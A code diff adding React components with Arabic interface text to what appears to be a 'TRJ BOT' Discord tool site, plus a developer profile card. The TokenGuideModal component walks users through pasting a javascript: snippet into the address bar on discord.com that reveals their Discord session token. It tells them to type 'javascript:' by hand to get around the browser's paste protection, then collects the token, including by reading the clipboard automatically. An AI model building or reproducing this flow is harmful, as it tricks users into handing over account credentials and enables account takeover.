+function TokenGuideModal({ show, onClose, onTokenExtracted }: { show: boolean; onClose: () => void; onTokenExtracted?: (token: string) => void }) {
+  const urlCode = `(function(){location.reload();var i=document.createElement('iframe');document.body.appendChild(i);document.write(i.contentWindow.localStorage.token)})()`
+  const fullCode = `javascript:${urlCode}`
+
+  const [phase, setPhase] = useState<'main' | 'guide'>('main')
+  const [tokenInput, setTokenInput] = useState('')
+  const [copiedCode, setCopiedCode] = useState(false)
+  const [autoPasted, setAutoPasted] = useState(false)
+  const [tokenValid, setTokenValid] = useState<boolean | null>(null)
+
+  const copyUrlCode = () => {
+    navigator.clipboard.writeText(urlCode).then(() => {
+      setCopiedCode(true); setTimeout(() => setCopiedCode(false), 3000)
+    }).catch(() => {
+      const ta = document.createElement('textarea'); ta.value = urlCode; ta.style.position = 'fixed'; ta.style.left = '-9999px'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta)
+      setCopiedCode(true); setTimeout(() => setCopiedCode(false), 3000)
+    })
+  }
+
+  const startExtract = () => {
+    copyUrlCode()
+    setPhase('guide')
+    setTimeout(() => {
+      try { navigator.clipboard.readText().then(text => { if (text && text.length > 50 && text.includes('.')) { setTokenInput(text); setAutoPasted(true); setTokenValid(/^[A-Za-z0-9._-]+$/.test(text) && text.length > 50) } }).catch(() => {}) } catch {}
+    }, 8000)
+  }
+
+  const handleTokenSubmit = () => {
+    if (tokenInput.length > 50) { setTokenValid(true); if (onTokenExtracted) onTokenExtracted(tokenInput) }
+  }
+
+  useEffect(() => {
+    if (show) { const id = requestAnimationFrame(() => { setPhase('main'); setTokenInput(''); setAutoPasted(false); setTokenValid(null) }); return () => cancelAnimationFrame(id) }
+  }, [show])
+
+  if (!show) return null
+
+  return (
+    <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-0 sm:p-4" onClick={onClose}>
+      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
+      <div className="relative bg-[#0a0e14] border border-green-500/20 rounded-t-2xl sm:rounded-2xl w-full sm:max-w-md shadow-2xl shadow-green-500/10 animate-slide-up max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
+        <div className="p-5">
+
+          {/* Header */}
+          <div className="flex items-center justify-between mb-4">
+            <div className="flex items-center gap-2">
+              <span className="text-xl">🎫</span>
+              <h3 className="font-black text-green-400 text-sm">كيف تجيب توكن</h3>
+            </div>
+            <button onClick={onClose} className="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white/80 hover:bg-white/10 cursor-pointer transition-colors text-sm">✕</button>
+          </div>
+
+          {phase === 'main' && (
+            <>
+              <div className="text-center mb-5">
+                <div className="text-6xl mb-4">🔑</div>
+                <p className="text-lg text-white/90 font-black mb-2">جلب التوكن بسهولة!</p>
+                <p className="text-[11px] text-white/30 leading-relaxed max-w-xs mx-auto">
+                  طريق سهل ومباشر - فقط ركب الكود في شريط العنوان
+                </p>
+              </div>
+
+              <button onClick={startExtract} className="w-full py-6 rounded-2xl font-black text-xl transition-all cursor-pointer border active:scale-[0.97] mb-4 flex items-center justify-center gap-3 bg-gradient-to-r from-green-600/30 to-emerald-500/30 text-green-300 border-green-500/40 hover:from-green-600/40 hover:to-emerald-500/40 shadow-xl shadow-green-500/10">
+                <span className="text-3xl">⚡</span>
+                ابدأ - جلب التوكن
+              </button>
+
+              {/* 3-step preview */}
+              <div className="grid grid-cols-3 gap-2 mb-3">
+                <div className="bg-green-500/5 rounded-xl p-3 border border-green-500/10 text-center">
+                  <div className="text-lg mb-1">1️⃣</div>
+                  <p className="text-[9px] text-green-300/60">اضغط الزر</p>
+                </div>
+                <div className="bg-cyan-500/5 rounded-xl p-3 border border-cyan-500/10 text-center">
+                  <div className="text-lg mb-1">2️⃣</div>
+                  <p className="text-[9px] text-cyan-300/60">اركب في URL</p>
+                </div>
+                <div className="bg-purple-500/5 rounded-xl p-3 border border-purple-500/10 text-center">
+                  <div className="text-lg mb-1">3️⃣</div>
+                  <p className="text-[9px] text-purple-300/60">انسخ التوكن</p>
+                </div>
+              </div>
+
+              <div className="bg-yellow-500/5 rounded-xl p-3 border border-yellow-500/10">
+                <p className="text-[10px] text-yellow-300/50 text-center leading-relaxed">
+                  ⚠️ لازم تكون مسجل دخول في ديسكورد على المتصفح
+                </p>
+              </div>
+
+              {/* فيديو */}
+              <div className="bg-red-500/5 rounded-xl p-3 border border-red-500/15 mt-3">
+                <div className="flex items-center gap-2 mb-2">
+                  <span className="text-sm">🎥</span>
+                  <span className="text-[11px] text-red-400 font-bold">شرح بالفيديو</span>
+                </div>
+                <a href="https://www.youtube.com/shorts/owx2Y1FagFQ" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">
+                  <span className="text-lg">▶️</span>
+                  <span className="text-xs text-red-300 font-bold">مشاهدة الشرح على يوتيوب</span>
+                </a>
+              </div>
+            </>
+          )}
+
+          {phase === 'guide' && (
+            <>
+              {/* Progress */}
+              <div className="flex gap-1 mb-5">
+                {[
+                  { label: 'نسخ', icon: copiedCode ? '✅' : '📋', color: copiedCode ? 'green' : 'white' },
+                  { label: 'URL', icon: '🔗', color: 'cyan' },
+                  { label: 'توكن', icon: '🎫', color: 'purple' },
+                ].map((s, i) => (
+                  <div key={i} className="flex-1 text-center">
+                    <div className={`text-[10px] mb-1 ${s.color === 'green' ? 'text-green-400' : s.color === 'cyan' ? 'text-cyan-400' : 'color' in s && s.color === 'purple' ? 'text-purple-400' : 'text-white/30'}`}>
+                      {s.icon} {s.label}
+                    </div>
+                    <div className={`h-1 rounded-full ${i === 0 ? (copiedCode ? 'bg-green-500' : 'bg-white/10') : i === 1 ? 'bg-cyan-500/30' : 'bg-purple-500/30'}`} />
+                  </div>
+                ))}
+              </div>
+
+              {/* Steps */}
+              <div className="space-y-3 mb-5">
+                {/* Step 1 */}
+                <div className={`rounded-2xl p-4 border transition-all ${copiedCode ? 'bg-green-500/8 border-green-500/20' : 'bg-white/3 border-white/5'}`}>
+                  <div className="flex items-center gap-3">
+                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-black flex-shrink-0 ${copiedCode ? 'bg-green-500/30 text-green-400' : 'bg-white/10 text-white/40'}`}>
+                      {copiedCode ? '✓' : '1'}
+                    </div>
+                    <div>
+                      <p className={`text-xs font-bold ${copiedCode ? 'text-green-400' : 'text-white/50'}`}>تم نسخ الكود</p>
+                      <p className="text-[10px] text-white/25 mt-0.5">الكود في الحافظة جاهز</p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Step 2 - URL Bar Method */}
+                <div className="rounded-2xl p-4 border bg-cyan-500/5 border-cyan-500/15">
+                  <div className="flex items-start gap-3">
+                    <div className="w-8 h-8 rounded-full bg-cyan-500/20 text-cyan-400 text-sm font-black flex items-center justify-center flex-shrink-0">2</div>
+                    <div className="flex-1">
+                      <p className="text-xs font-bold text-cyan-400 mb-2">اذهب لديسكورد واركب الكود في شريط العنوان (URL)</p>
+
+                      {/* Visual URL bar */}
+                      <div className="bg-black/40 rounded-xl p-2.5 border border-white/10 mb-3">
+                        <div className="flex items-center gap-2">
+                          <div className="bg-green-500/20 rounded-lg px-1.5 py-1 text-[9px] font-mono text-green-400 font-bold flex-shrink-0">🔒</div>
+                          <div className="flex-1 bg-white/5 rounded-lg px-2.5 py-1.5 text-[9px] font-mono overflow-hidden">
+                            <span className="text-cyan-400 font-bold">{'javascript:'}</span><span className="text-white/50">{'(function(){location.reload()...'}</span>
+                          </div>
+                        </div>
+                      </div>
+
+                      <div className="space-y-2">
+                        <div className="flex items-start gap-2">
+                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">أ.</span>
+                          <p className="text-[10px] text-white/50">افتح ديسكورد على المتصفح <span className="text-cyan-400/70 font-bold">discord.com/app</span></p>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ب.</span>
+                          <p className="text-[10px] text-white/50">اضغط على شريط العنوان (URL bar) في الأعلى</p>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ج.</span>
+                          <p className="text-[10px] text-white/50"><span className="text-yellow-400 font-bold">الصق الكود</span> في شريط العنوان</p>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">د.</span>
+                          <div>
+                            <p className="text-[10px] text-white/50">روح <span className="text-yellow-400 font-bold">آخر سطر</span> (بعد الكود) واكتب يدوياً:</p>
+                            <div className="bg-yellow-500/10 rounded-lg px-2.5 py-1.5 mt-1 border border-yellow-500/20">
+                              <code className="text-[10px] text-yellow-300 font-mono font-bold">javascript:</code>
+                            </div>
+                          </div>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ه.</span>
+                          <p className="text-[10px] text-white/50">اضغط <span className="text-green-400 font-bold">Enter</span></p>
+                        </div>
+                      </div>
+
+                      {/* Important note about javascript: */}
+                      <div className="bg-yellow-500/5 rounded-xl p-3 border border-yellow-500/20 mt-3">
+                        <p className="text-[10px] text-yellow-300/70 font-bold mb-1">⚠️ ليه لازم تكتب javascript: يدوياً؟</p>
+                        <p className="text-[9px] text-yellow-300/50 leading-relaxed">المتصفح يمنع لصق كلمة javascript: لأسباب أمنية. عشان كذا لازم تكتبها يدوياً بنفسك في بداية السطر. بس اكتبها واضغط Enter وراح يشتغل مباشرة!</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Step 3 - Result */}
+                <div className="rounded-2xl p-4 border bg-purple-500/5 border-purple-500/15">
+                  <div className="flex items-start gap-3">
+                    <div className="w-8 h-8 rounded-full bg-purple-500/20 text-purple-400 text-sm font-black flex items-center justify-center flex-shrink-0">3</div>
+                    <div className="flex-1">
+                      <p className="text-xs font-bold text-purple-400 mb-2">توكن يظهر على الشاشة</p>
+                      <p className="text-[10px] text-white/40 mb-2">بعد ما تضغط Enter، الصفحة تتحمل وتظهر التوكن. انسخه كامل!</p>
+                      <div className="bg-black/30 rounded-xl p-3 border border-white/5">
+                        <div className="bg-white/5 rounded-lg p-2 border border-white/10">
+                          <p className="text-[9px] text-green-400 font-mono truncate">eyJhbGciOiJIUzI1NiJ9.eyJpZCI6I...</p>
+                        </div>
+                        <p className="text-[9px] text-purple-300/40 mt-2 text-center">انسخ التوكن الظاهر (Ctrl+C)</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              {/* Token paste area */}
+              <div className="bg-green-500/5 rounded-2xl p-4 border border-green-500/20 mb-4">
+                <div className="flex items-center gap-2 mb-3">
+                  <span className="text-sm">📋</span>
+                  <p className="text-xs font-bold text-green-400">
+                    {autoPasted ? '✅ تم التلقائي! تأكد و اضغط استخدام' : 'الصق التوكن هنا'}
+                  </p>
+                </div>
+                <div className="flex gap-2">
+                  <input type="text" value={tokenInput} onChange={e => { setTokenInput(e.target.value); setTokenValid(null); setAutoPasted(false) }} placeholder="الصق التوكن هنا..." className="flex-1 bg-black/40 border border-green-500/20 rounded-xl px-3 py-2.5 text-xs text-white font-mono placeholder-white/15 focus:outline-none focus:border-green-400/40 transition-colors" autoFocus />
+                  {tokenInput.length > 50 ? (
+                    <button onClick={handleTokenSubmit} className="px-4 py-2.5 rounded-xl font-bold text-xs cursor-pointer bg-green-500/20 text-green-400 border border-green-500/30 hover:bg-green-500/30 transition-colors active:scale-[0.97]">✅ استخدام</button>
+                  ) : (
+                    <button onClick={() => { try { navigator.clipboard.readText().then(text => { if (text) { setTokenInput(text); setAutoPasted(true); setTokenValid(text.length > 50 && /^[A-Za-z0-9._-]+$/.test(text)) } }).catch(() => {}) } catch {} }} className="px-3 py-2.5 rounded-xl font-bold text-[10px] cursor-pointer bg-white/5 text-white/40 border border-white/10 hover:bg-white/10 transition-colors">📋 لصق</button>
+                  )}
+                </div>
+                {tokenInput.length > 0 && tokenInput.length <= 50 && (
+                  <p className="text-[9px] text-red-400/60 mt-2">❌ التوكن قصير جداً - تأكد أنك نسخته كامل</p>
+                )}
+                {tokenValid === true && (
+                  <p className="text-[9px] text-green-400/80 mt-2">✅ التوكن صالح! اضغط &quot;استخدام&quot;</p>
+                )}
+              </div>
+
+              {/* الكود للنسخ */}
+              <div className="bg-white/3 rounded-xl p-3 border border-white/5 mb-4">
+                <div className="flex items-center gap-2 mb-2">
+                  <span className="text-[10px] text-white/40">📎 الكود (الصقه في URL):</span>
+                  <button onClick={copyUrlCode} className="text-[9px] text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 cursor-pointer transition-colors">
+                    {copiedCode ? '✅ تم النسخ' : '📋 نسخ'}
+                  </button>
+                </div>
+                <div className="bg-black/40 rounded-lg p-2 border border-white/5 overflow-x-auto">
+                  <code className="text-[7px] text-cyan-300/70 whitespace-nowrap block font-mono">{fullCode}</code>
+                </div>
+              </div>
+
+              {/* فيديو */}
+              <div className="bg-red-500/5 rounded-xl p-3 border border-red-500/15 mb-4">
+                <div className="flex items-center gap-2 mb-2">
+                  <span className="text-sm">🎥</span>
+                  <span className="text-[11px] text-red-400 font-bold">شرح بالفيديو</span>
+                </div>
+                <a href="https://www.youtube.com/shorts/owx2Y1FagFQ" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">
+                  <span className="text-lg">▶️</span>
+                  <span className="text-xs text-red-300 font-bold">مشاهدة الشرح على يوتيوب</span>
+                </a>
+              </div>
+
+              {/* Bottom buttons */}
+              <div className="flex gap-2">
+                <button onClick={startExtract} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
+                  📋 نسخ الكود مرة ثانية
+                </button>
+                <button onClick={() => setPhase('main')} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
+                  🔙 رجوع
+                </button>
+              </div>
+            </>
+          )}
+        </div>
+      </div>
+    </div>
+  )
+}
+
+function ProfileModal({ show, onClose }: { show: boolean; onClose: () => void }) {
+  if (!show) return null
+
+  return (
+    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4" onClick={onClose}>
+      {/* Animated background overlay */}
+      <div className="absolute inset-0 bg-black/85 backdrop-blur-md" />
+
+      {/* Floating particles */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-green-400/30 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
+        <div className="absolute top-1/3 right-1/3 w-1.5 h-1.5 bg-emerald-400/20 rounded-full animate-ping" style={{ animationDuration: '4s' }} />
+        <div className="absolute bottom-1/4 left-1/3 w-1 h-1 bg-green-300/25 rounded-full animate-ping" style={{ animationDuration: '5s' }} />
+        <div className="absolute top-1/2 right-1/4 w-1.5 h-1.5 bg-purple-400/20 rounded-full animate-ping" style={{ animationDuration: '3.5s' }} />
+      </div>
+
+      {/* Profile Card */}
+      <div
+        className="relative w-full max-w-sm sm:max-w-md animate-slide-up"
+        onClick={e => e.stopPropagation()}
+      >
+        {/* Outer glow */}
+        <div className="absolute -inset-1 bg-gradient-to-r from-green-500/20 via-emerald-500/20 to-green-500/20 rounded-3xl blur-xl" />
+        <div className="absolute -inset-0.5 bg-gradient-to-r from-green-500/10 via-emerald-500/10 to-green-500/10 rounded-3xl blur-md" />
+
+        <div className="relative bg-[#111827] border border-green-500/20 rounded-3xl shadow-2xl shadow-green-500/10 overflow-hidden">
+          {/* Banner */}
+          <div className="relative h-32 sm:h-36 bg-gradient-to-br from-green-600 via-emerald-500 to-green-400 overflow-hidden">
+            <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGZpbGw9IiNmZmZmZmYiIGZpbGwtb3BhY2l0eT0iMC4wNSI+PHBhdGggZD0iTTAgMGg0MHY0MEgweiIvPjwvZz48L2c+PC9zdmc+')] opacity-50" />
+            <div className="absolute inset-0 bg-gradient-to-t from-[#111827] via-transparent to-transparent" />
+
+            {/* Close button */}
+            <button onClick={onClose} className="absolute top-3 right-3 w-8 h-8 rounded-full bg-black/40 backdrop-blur-sm flex items-center justify-center text-white/60 hover:text-white hover:bg-black/60 cursor-pointer transition-all text-sm border border-white/10">
+              ✕
+            </button>
+          </div>
+
+          {/* Avatar */}
+          <div className="relative px-6 -mt-14">
+            <div className="relative inline-block">
+              {/* Avatar glow ring */}
+              <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-emerald-400 rounded-full opacity-60 blur-sm" />
+              <div className="relative w-24 h-24 rounded-full overflow-hidden border-4 border-[#111827] shadow-xl">
+                <img src="/profile.png" alt="TRJ" className="w-full h-full object-cover" />
+              </div>
+              {/* Online indicator */}
+              <div className="absolute bottom-1 right-1 w-5 h-5 bg-green-500 rounded-full border-[3px] border-[#111827] flex items-center justify-center">
+                <div className="w-2 h-2 bg-green-300 rounded-full" />
+              </div>
+            </div>
+          </div>
+
+          {/* User Info */}
+          <div className="px-6 pt-3 pb-5">
+            <div className="flex items-center gap-2 mb-1">
+              <h2 className="text-xl font-black text-white">trj.py</h2>
+              <span className="text-[9px] font-bold text-green-400 bg-green-500/15 px-2 py-0.5 rounded-full border border-green-500/30 tracking-wider">DEVELOPER</span>
+            </div>
+
+            <div className="text-sm text-white/40 mb-4 font-mono">trj.py</div>
+
+            {/* Custom Status */}
+            <div className="bg-white/5 rounded-xl px-3 py-2 border border-white/5 mb-5 flex items-center gap-2">
+              <div className="w-2.5 h-2.5 bg-green-400 rounded-full animate-pulse" />
+              <span className="text-xs text-white/50">Building TRJ BOT v4.3 ⚡ 34 ميزة</span>
+            </div>
+
+            {/* Stats */}
+            <div className="grid grid-cols-3 gap-2 mb-5">
+              <div className="bg-green-500/8 rounded-xl p-2.5 border border-green-500/15 text-center">
+                <div className="text-lg mb-0.5">⚡</div>
+                <div className="text-sm font-black text-white">34</div>
+                <div className="text-[9px] text-white/40">Features</div>
+              </div>
+              <div className="bg-emerald-500/8 rounded-xl p-2.5 border border-emerald-500/15 text-center">
+                <div className="text-lg mb-0.5">✅</div>
+                <div className="text-sm font-black text-white">100%</div>
+                <div className="text-[9px] text-white/40">Working</div>
+              </div>
+              <div className="bg-cyan-500/8 rounded-xl p-2.5 border border-cyan-500/15 text-center">
+                <div className="text-lg mb-0.5">🌐</div>
+                <div className="text-sm font-black text-white">24/7</div>
+                <div className="text-[9px] text-white/40">Online</div>
+              </div>
+            </div>
+
+            {/* Separator */}
+            <div className="border-t border-white/5 mb-5" />
+
+            {/* Badges */}
+            <div className="flex flex-wrap gap-1.5 mb-5">
+              <span className="text-[10px] font-bold text-yellow-400 bg-yellow-500/10 px-2.5 py-1 rounded-full border border-yellow-500/20">👑 Developer</span>
+              <span className="text-[10px] font-bold text-green-400 bg-green-500/10 px-2.5 py-1 rounded-full border border-green-500/20">🛡️ Creator</span>
+              <span className="text-[10px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">⚡ Pro</span>
+              <span className="text-[10px] font-bold text-purple-400 bg-purple-500/10 px-2.5 py-1 rounded-full border border-purple-500/20">💎 Premium</span>
+            </div>
+
+            {/* Separator */}
+            <div className="border-t border-white/5 mb-5" />
+
+            {/* About */}
+            <div className="mb-5">
+              <h3 className="text-[10px] text-white/30 uppercase tracking-wider font-bold mb-2">About Me</h3>
+              <p className="text-xs text-white/50 leading-relaxed">
+                مطور TRJ BOT - أقوى موقع ديسكورد عربية
+                <br />
+                <span className="text-white/30">Developer of the most powerful Arabic Discord tool</span>
+              </p>
+            </div>
+
+            {/* Discord tag */}
+            <div className="flex items-center justify-center">
+              <div className="bg-[#5865F2]/10 border border-[#5865F2]/20 rounded-full px-4 py-2 flex items-center gap-2">
+                <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z" /></svg>
+                <span className="text-xs font-bold text-[#5865F2]">trj.py</span>
+              </div>
+            </div>
+
+            {/* Social Links */}
+            <div className="mt-4 space-y-2">
+              <a href="https://www.youtube.com/@Trojan1888" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-2.5 hover:bg-red-500/20 transition-colors">
+                <svg className="w-4 h-4 text-red-400" viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
+                <span className="text-xs font-bold text-red-400">قناة يوتوب</span>
+              </a>
+              <a href="https://discord.gg/aWS4P43P3f" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full bg-[#5865F2]/10 border border-[#5865F2]/20 rounded-xl px-4 py-2.5 hover:bg-[#5865F2]/20 transition-colors">
+                <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z" /></svg>
+                <span className="text-xs font-bold text-[#5865F2]">سيرفر ديسكورد</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  )
+}
